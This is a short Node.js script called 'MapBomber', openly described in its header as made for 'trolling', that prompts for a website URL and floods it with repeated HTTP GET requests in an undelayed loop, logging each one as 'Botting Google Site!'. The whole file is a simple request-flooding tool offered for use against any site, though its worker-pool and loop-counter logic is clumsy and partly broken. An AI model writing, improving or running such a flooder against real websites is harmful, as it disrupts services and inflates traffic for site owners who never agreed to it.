/*  Stiizzy Cat was here
    This was made for trolling purposes only and for a proof of concept :kek:
    Credit me if you use it LOL 
*/
const {
	StaticPool
} = require('node-worker-threads-pool');
var prompt = require('prompt-sync')();
const axios = require('axios');
var counter = require('counter');
const chalk = require('chalk');
fs = require('fs');
count = counter(0);

const staticPool = new StaticPool({
	size: 10,
	task: (n) => n + 1
});
console.log(' ███▄ ▄███▓ ▄▄▄       ██▓███   ▄▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄   ▓█████  ██▀███  ')
console.log(' ▓██▒▀█▀ ██▒▒████▄    ▓██░  ██▒▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ ▓█   ▀ ▓██ ▒ ██▒')
console.log(' ▓██    ▓██░▒██  ▀█▄  ▓██░ ██▓▒▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██▒███   ▓██ ░▄█ ▒')
console.log(' ▒██    ▒██ ░██▄▄▄▄██ ▒██▄█▓▒ ▒▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄')
console.log(' ▒██▒   ░██▒ ▓█   ▓██▒▒██▒ ░  ░░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓░▒████▒░██▓ ▒██▒')
console.log(' ░ ▒░   ░  ░ ▒▒   ▓▒█░▒▓▒░ ░  ░░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░')
console.log(' ░  ░      ░  ▒   ▒▒ ░░▒ ░     ▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░')
console.log(' ░      ░     ░   ▒   ░░        ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░    ░     ░░   ░')
console.log(' ░         ░  ░          ░          ░ ░         ░    ░         ░  ░   ░')
console.log('                                          ░                           ░                       ')
console.log(chalk.bgMagenta('ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤv1.0 Coded By: https://github.com/StiizzyCatㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ'))
var website = prompt('Enter The website url: ');
console.log(chalk.greenBright('Initalizing Script!'))
var wait = setTimeout(() => {
/* the Threads Start
 im new to this threads package so if im doing it wrong please tell me :smile: */
staticPool.exec(10).then((result) => {
	var t = 0
	var int = setInterval(() => {
		axios.get(website).catch(error => {
            console.log(chalk.redBright('ERROR OCCURED, SCRIPT STOPPING!!!')) 
	    process.exit() 
        })
		console.log(chalk.greenBright("Botting Google Site!", chalk.yellowBright(count.value += 1)))
	})
	t++
	if (t > 9999999999999) clearInterval(int)
}, 300)
}, 5000);
